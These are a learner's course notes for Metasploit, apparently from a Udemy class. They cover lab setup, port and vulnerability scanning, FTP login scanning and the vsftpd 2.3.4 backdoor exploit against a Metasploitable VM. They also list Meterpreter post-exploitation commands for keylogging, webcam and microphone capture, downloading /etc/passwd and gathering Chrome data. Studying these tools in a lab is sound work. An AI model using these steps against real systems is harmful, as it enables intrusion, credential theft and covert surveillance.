- [Course Link](https://www.udemy.com/course/metasploit-from-scratch-beginner-to-professional/)

- Install kali linux and metasploit - Setting up a lab environment

    - https://www.kali.org/get-kali/#kali-virtual-machines | vmware

    - https://sourceforge.net/projects/metasploitable/

- Open both virtual machines in vmware workstation 17 player | Configuring Framework

- Start kali linux and metasploit

- Make sure postgresql is running in kali linux

    - sudo service postgresql start

    - sudo service postgresql status

    - sudo msfdb init

    - sudo msfdb status

    - sudo msfconsole

    - db_status

    - db_connect -y /usr/share/metasploit-framework/config/database.yml

    - db_status


- Creating and managing workspaces

    - workspace -a <name> : create a new workspace

    - workspace : list all workspaces

    - workspace <name> : switch to a workspace

    - workspace -d <name> : delete a workspace

    - workspaces : list all workspaces

    - workspace -r : rename a workspace

    - hosts : list all hosts in the current workspace

    - services : list all services in the current workspace

    - db_nmap <ip> : scan a host and add it to the database

    - db_nmap -sV -p 1-65535 <ip> : scan all ports and services of a host

    - vulns : list all vulnerabilities in the current workspace

    - notes : list all notes in the current workspace

- msfconsole

    - msfconsole : start the metasploit console

    - help : list all commands

    - banner : display the metasploit banner

    - version : display the metasploit version

    - search <name> : search for a module, eg search vsftpd

    - use <module> : use a module, eg use exploit/unix/ftp/vsftpd_234_backdoor

    - show options : show the options of the current module

    - set <option> <value> : set an option, eg set RHOSTS <ip>

    - setg <option> <value> : set a global option, eg setg RHOSTS <ip>  

    - getg <option> : get a global option, eg getg RHOSTS 

    - unset <option> : unset an option, eg unset RHOSTS 

    - search type:payload : search for a payload 

    - show payloads : show all payloads for the current module

    - search type:auxiliary : search for auxiliary modules

    - show auxiliary : show all auxiliary modules

    - search type:payload platform:windows : search for windows payloads

    - search type:exploit platform:linux : search for linux exploits

    - search type:payload name:ssh : search for ssh payloads

    - set PAYLOAD <payload> : set a payload, eg set PAYLOAD linux/x86/meterpreter/reverse_tcp

    - show encoders : show all encoders

    - set LHOST <ip> : set the local host, eg set LHOST <ip>

    - set LPORT <port> : set the local port, eg set LPORT 4444

    - save : save the current module settings

- Port scanning and Enumeration

    - nmap -sS -sV -O -p- <ip> -oX M1 : scan all ports and services of a host and save the output in xml format, M1 is the file name

    - db_nmap -sS -sV -O <ip> : scan a host and add it to the database

    - workspace -a M1 : create a new workspace named M1

    - workspace M1 : switch to the M1 workspace

    - db_import M1 : import the nmap scan results into the database

    - hosts : list all hosts in the current workspace

    - services : list all services in the current workspace

    - vulns : list all vulnerabilities in the current workspace

    - use auxiliary/scanner/ftp/ftp_version : use the ftp version scanner

    - set RHOSTS <ip> : set the remote host, eg set RHOSTS <ip>

    - run : run the module

    - use auxiliary/scanner/ftp/ftp_anonymous : use the ftp anonymous login scanner

- Auxiliar modules

    - workspace -a enum : create a new workspace named enum

    - workspace enum : switch to the enum workspace

    - search portscan : search for port scanning modules

    - use auxiliary/scanner/portscan/tcp : use the tcp port scanner

    - show options : show the options of the current module

    - set RHOSTS <ip> : set the remote host, eg set RHOSTS <ip>

    - run : run the module

    - search ftp_version : search for ftp version modules

    - use auxiliary/scanner/ftp/ftp_version : use the ftp version scanner

    - set RHOSTS <ip> : set the remote host, eg set RHOSTS <ip>

    - run : run the module

    - search ftp_login : search for ftp login modules

    - use auxiliary/scanner/ftp/ftp_login : use the ftp login scanner

    - set stop_on_success true : stop on first successful login

    - set RHOSTS <ip> : set the remote host, eg set RHOSTS <ip>
    - set USERNAME anonymous : set the username, eg set USERNAME anonymous
    - set PASSWORD anonymous : set the password, eg set PASSWORD anonymous
    - run : run the module


- Vulnerability Scanning

    - https://www.tenable.com/downloads/nessus | download nessus

    - go to the path and dpkg -i <file>.deb | sudo dpkg -i <file>.deb

    - sudo systemctl start nessusd

    - open a browser and go to https://localhost:8834

    - create an account and login - activate nessus essentials, used the [video](https://www.youtube.com/watch?v=gowlCbn3QGg) to set it up | [Download Link](https://www.tenable.com/downloads/nessus?loginAttempted=true), got the activation code from the email(temp email created for it)

    - create a new scan - basic network scan - name it M1 - set the target ip - save

    - eg - go for portscan - save - launch

    - after the scan is complete - go to the report - export - nessus - save it as M1.nessus

    - db_import M1.nessus : import the nessus scan results into the database

    - vulns : list all vulnerabilities in the current workspace

    - use exploit/unix/ftp/vsftpd_234_backdoor : use the vsftpd 2.3.4 backdoor exploit

    - set RHOSTS <ip> : set the remote host, eg set RHOSTS <ip>

    - set PAYLOAD cmd/unix/interact : set the payload, eg set PAYLOAD cmd/unix/interact

    - run : run the module

    - exploit command can also be used to run the module

- Post Exploitation

    - sessions : list all active sessions

    - sessions -i <id> : interact with a session, eg sessions -i 1

    - background : background the current session

    - exit : exit the current session

    - sysinfo : display system information

    - getuid : display the user id

    - ifconfig : display network interfaces

    - ipconfig : display network interfaces (windows)

    - pwd : display the current working directory

    - ls : list files in the current directory

    - cd <path> : change directory, eg cd /root

    - download <file> : download a file, eg download /etc/passwd

    - upload <file> : upload a file, eg upload /root/file.txt

    - cat <file> : display the contents of a file, eg cat /etc/passwd

    - edit <file> : edit a file, eg edit /etc/passwd

    - shell : open a shell on the target system

    - exit : exit the shell

    - use post/multi/gather/enum_configs : use the enum configs post module

    - set SESSION <id> : set the session id, eg set SESSION 1

    - run : run the modules

    - use post/multi/gather/enum_chrome : use the enum chrome post module

    - set SESSION <id> : set the session id, eg set SESSION 1

    - run : run the modules

- Meterpreter

    - sessions : list all active sessions

    - sessions -i <id> : interact with a session, eg sessions -i 1

    - background : background the current session

    - exit : exit the current session

    - sysinfo : display system information

    - getuid : display the user id

    - ifconfig : display network interfaces

    - ipconfig : display network interfaces (windows)

    - pwd : display the current working directory

    - ls : list files in the current directory

    - cd <path> : change directory, eg cd /root

    - download <file> : download a file, eg download /etc/passwd

    - upload <file> : upload a file, eg upload /root/file.txt

    - cat <file> : display the contents of a file, eg cat /etc/passwd

    - edit <file> : edit a file, eg edit /etc/passwd

    - shell : open a shell on the target system

    - exit : exit the shell

    - screenshot : take a screenshot of the target system

    - webcam_list : list all webcams on the target system

    - webcam_snap <id> : take a snapshot from a webcam, eg webcam_snap 0

    - keyscan_start : start keylogging

    - keyscan_stop : stop keylogging

    - keyscan_dump : dump the keystrokes

    - record_mic <seconds> : record audio from the microphone, eg record_mic 10

    - stop_mic_recording : stop microphone recording

    - play_mic_recording : play the recorded audio

    - run post/multi/gather/enum_configs : run the enum configs post module

    - run post/multi/gather/enum_chrome : run the enum chrome post module

- Course Completion Certificate

    - [Certificate of Completion](Metasploit%20from%20Scratch%20Beginner%20to%20Professional.pdf)